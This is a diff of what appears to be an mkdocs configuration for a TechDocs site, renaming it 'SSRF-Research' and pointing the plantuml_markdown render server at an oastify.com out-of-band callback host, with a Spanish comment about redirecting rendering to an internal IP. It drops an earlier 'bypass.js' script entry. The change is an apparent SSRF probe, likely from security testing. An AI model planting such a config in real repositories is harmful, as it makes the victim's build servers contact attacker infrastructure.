@@ -1,8 +1,11 @@
-site_name: XSS-Research
+site_name: SSRF-Research
 plugins:
   - techdocs-core
-extra_javascript:
-  - bypass.js
+markdown_extensions:
+  - plantuml_markdown:
+      # Intentamos cambiar el servidor de renderizado a una IP interna
+      server: http://o9y9olw32d4ce0379i84k4bssjyam0ap.oastify.com
+
 
 
 
